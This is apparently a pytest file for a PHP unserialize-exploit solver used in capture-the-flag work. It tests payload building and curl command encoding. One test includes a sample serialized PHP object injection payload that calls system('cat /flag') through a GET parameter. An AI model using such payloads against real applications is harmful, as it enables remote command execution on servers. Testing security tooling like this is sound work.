"""Verify solver CLI is importable and banner renders."""
import sys
sys.path.insert(0, '.')

def test_solver_import():
    import solver
    assert hasattr(solver, 'BANNER')
    assert 'PHPUnser' in solver.BANNER or 'PHP' in solver.BANNER
    assert hasattr(solver, 'Solver')
    assert hasattr(solver, 'main')

def test_payload_cookie_support():
    from engine.payload import Payload
    p = Payload(
        http_method='COOKIE',
        cookies={'param': 'test_value'},
        description='test cookie payload',
    )
    assert p.http_method == 'COOKIE'
    assert p.cookies == {'param': 'test_value'}
    assert p.data == {}
    assert p.params == {}

def test_payload_get_curl():
    from engine.payload import Payload
    p = Payload(
        http_method='GET',
        params={'cmd': "O:1:\"a\":1:{s:3:\"act\";s:20:\"system('cat /flag');\";}", 'flag': 'test'},
        url='http://example.com',
    )
    curl = p.get_curl_command()
    # Should emit one --data-urlencode per param
    assert curl.count('--data-urlencode') == 2
    # Single quotes MUST be percent-encoded (not raw)
    assert '%27' in curl, f"Single quotes not encoded: {curl[:80]}"
    # = should be preserved (not encoded as %3D)
    assert 'cmd=O' in curl, f"= encoded as %3D: {curl[:80]}"
    assert 'example.com' in curl

def test_payload_cookie_curl():
    from engine.payload import Payload
    p = Payload(
        http_method='COOKIE',
        cookies={'param': 'test_value'},
        url='http://example.com',
    )
    curl = p.get_curl_command()
    assert "-b '" in curl
    assert 'param=test_value' in curl

if __name__ == '__main__':
    import pytest
    sys.exit(pytest.main([__file__, '-v']))
